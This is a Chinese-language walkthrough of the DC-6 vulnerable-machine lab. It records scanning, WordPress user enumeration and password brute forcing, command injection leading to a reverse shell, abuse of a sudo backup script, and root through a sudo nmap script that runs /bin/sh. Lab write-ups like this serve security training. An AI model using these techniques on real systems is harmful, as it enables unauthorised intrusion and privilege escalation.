### 启动ssh服务并取得地址

```shell
┌──(kali㉿kali)-[~]
└─$ sudo systemctl start ssh.service
[sudo] password for kali: 
                                                                                                               
┌──(kali㉿kali)-[~]
└─$ ifconfig
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:2d:3d:f7:30  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 5 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.7.128  netmask 255.255.255.0  broadcast 192.168.7.255
        inet6 fe80::9ad1:f9e1:5ebb:a0ca  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:ae:51:81  txqueuelen 1000  (Ethernet)
        RX packets 13  bytes 10914 (10.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 34  bytes 10820 (10.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                                                               
┌──(kali㉿kali)-[~]
```

```
192.168.7.128
```


```shell
Microsoft Windows [版本 10.0.19045.5965]
(c) Microsoft Corporation。保留所有权利。

C:\Users\XM137>ssh kali@192.168.7.128
kali@192.168.7.128's password:
Linux kali 6.12.25-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.25-1kali1 (2025-04-30) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun 15 02:03:56 2025 from 192.168.7.1
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ae:51:81, IPv4: 192.168.7.128
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.7.1     00:50:56:c0:00:08       (Unknown)
192.168.7.2     00:50:56:e4:2a:ab       (Unknown)
192.168.7.134   00:0c:29:2c:51:a9       (Unknown)
192.168.7.254   00:50:56:fd:90:4a       (Unknown)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.896 seconds (135.02 hosts/sec). 4 responded

```

```DC6 IP
192.168.7.134
```

### [[nmap]] 扫描
先来看看都开放了哪些端口

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -A -v 192.168.7.134
```

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Did not follow redirect to http://wordy/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 00:0C:29:2C:51:A9 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Uptime guess: 198.839 days (since Thu Nov 28 05:28:02 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

其中再次提到了

```
Did not follow redirect to http://wordy/
```

手这次依然需要工添加hosts

```shell
┌──(kali㉿kali)-[~]
└─$ sudo vim /etc/hosts
```

![[dc6-vim.png]]

接下来我们使用kali 浏览器访问

![[dc6-wp.png]]

网站框架是wordpress

那么使用wpscan 扫下看看

```shell
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://wordy/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
```

好吧，先更新下数据库看看

```shell
┌──(kali㉿kali)-[~]
└─$ wpscan --update
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.
```

```shell
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://wordy/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordy/ [192.168.7.134]
[+] Started: Sun Jun 15 02:49:03 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jun 15 02:49:05 2025
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 39.919 KB
[+] Data Received: 359.61 KB
[+] Memory used: 271.062 MB
[+] Elapsed time: 00:00:02

┌──(kali㉿kali)-[~]
└─$

```

```
 WordPress version 5.1.1 identified (Insecure, released on 2019-03-13)
```

看其他师傅通过枚举插件，查插件漏洞进去的

得到wordpress 版本

```shell
┌──(kali㉿kali)-[~]
└─$ cewl -w dc6-cewl.txt http://wordy
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

这个版本信息貌似没什么用
### 尝试枚举用户名

```shell
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://wordy/ -e u
```


```
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

### 整理，得

```
admin
sarah
graham
mark
jens
```

```shell
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://wordy/ -U dc6-user.txt -P dc6-cewl.txt
```

```
[i] No Valid Passwords Found.
```

[[cewl]] 收集的不对呢

尝试kali自带的密码本
```shell
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://wordy/ -U dc6-user.txt -P /usr/share/wordlists/rockyou.txt
```

太长了，放弃

![[Pasted image 20250621193525.png]]
![[Pasted image 20250621194044.png]]
参考给出的提示

重新破解

```shell
┌──(kali㉿kali)-[~]
└─$ cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords-dc6.txt
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://wordy/ -U dc6-user.txt -P passwords-dc6.txt
```

```shell
[!] Valid Combinations Found:
 | Username: mark, Password: helpdesk01
```

下面尝试登录

![[Pasted image 20250621194239.png]]

dirb取得管理员url

```shell
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.7.134
```

![[Pasted image 20250621194910.png]]

![[Pasted image 20250621195748.png]]

成功登录

![[Pasted image 20250621195939.png]]

活动监视下有个工具

![[Pasted image 20250621200132.png]]

它可以反向解析主机，测试的IP地址是中国电信的DNS
![[Pasted image 20250621202208.png]]

这里的输入框有限制，换个短的ip
测试可以实现命令注入

![[Pasted image 20250621202230.png]]

在kali开启
```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvvp 2333
```

使用burp抓包修改

![[Pasted image 20250621203037.png]]

![[Pasted image 20250621203145.png]]

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

![[Pasted image 20250621203355.png]]

![[Pasted image 20250621203606.png]]

jens目录下有一个脚本文件，其中的命令是压缩html目录


mark/stuff目录下有一个 things-to-do.txt
![[Pasted image 20250621204017.png]]

其中有说添加新用户
那么尝试一下ssh登录
![[Pasted image 20250621204549.png]]
GSo7isUM1D4就是graham的密码

![[Pasted image 20250621204644.png]]

无密码sudo的

![[Pasted image 20250621205054.png]]
jens用户可以无密码sudo执行

尝试使用vim编辑，但是vim没有安装

使用echo加重定向修改文件
添加一行/bin/bash，尝试提权
目的是以jens的身份运行shell

```shell
graham@dc-6:~$ sudo -u jens /home/jens/backups.sh
```
以jens身份运行backups.sh

现在是jens用户下了
还是sudo -l 看一下

![[Pasted image 20250621205900.png]]
这个用户可以无密码使用nmap

nmap提权
让nmap运行/bin/bash

新建一个nmap脚本文件

```shell
jens@dc-6:~$ echo 'os.execute("/bin/sh")' > bash.nse
```

为什么不是bash，笔者在使用bash的时候出现了无法交互的问题，所以在这里使用了sh

```shell
jens@dc-6:~$ sudo nmap --script=bash.nse
```

![[Pasted image 20250621210735.png]]

直接输入ls就能看到flag
直接查看 cat theflag.txt 